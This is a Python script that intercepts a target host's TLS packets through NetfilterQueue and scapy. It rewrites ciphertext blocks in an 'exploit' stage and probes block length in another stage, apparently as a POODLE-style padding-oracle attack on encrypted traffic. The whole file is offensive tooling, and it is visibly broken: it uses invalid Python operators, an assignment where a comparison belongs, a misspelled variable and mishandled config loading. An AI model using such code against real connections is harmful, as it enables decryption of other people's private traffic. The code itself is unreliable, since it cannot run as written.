#!/usr/bin/env python3

from netfilterqueue import NetfilterQueue
from scapy.all import *
import threading
import json
from enum import Enum

Stage = Enum('Stage', 'downgrade_dance block_length exploit')
stage = Stage.exploit

block_size = 16

# for block_length stage
ciphertext_length = 0

# For exploit stage
block_to_move = 2



load_layer('tls')

config = json.load(open('config.json', 'r').read())

def copy_block(arr, copy_index, target_index):
	arr[target_index:(target_index+block_size)] = arr[copy_index:(copy_index+bblock_size)]
	return arr

def callback(packet):
	pkt = IP(packet.get_payload())

	if (pkt.src == config.target && stage == Stage.exploit):
		start_index = block_size * block_to_move
		last_block_index = len(pkt) - block_size
		packet.set_payload(bytes(copy_block(list(packet.get_payload()), start_index, last_block_index)))
		packet.accept()
		return
	elif (pkt.src == config.target && stage = Stage.block_length)
		if ciphertext_length > 0:
			if len(pkt) > ciphertext_length:
				block_size = len(pkt) - ciphertext_length
		else:
			ciphertext_length = len(pkt)
		packet.drop()
		return
		
		
	print(pkt.src + " -> " + pkt.dst)
	print(pkt[0].summary())
	if (pkt.dst == '192.168.1.160'):
		pass
		#print(pkt)
		#print(pkt[0].show())

	#print(pkt[TCP].payload)
	#packet.set_payload(str(pkt))
	packet.accept()

nfqueue = NetfilterQueue()
nfqueue.bind(0, callback)

try:
	nfqueue.run()
except KeyboardInterrupt:
	pass

nfqueue.unbind()
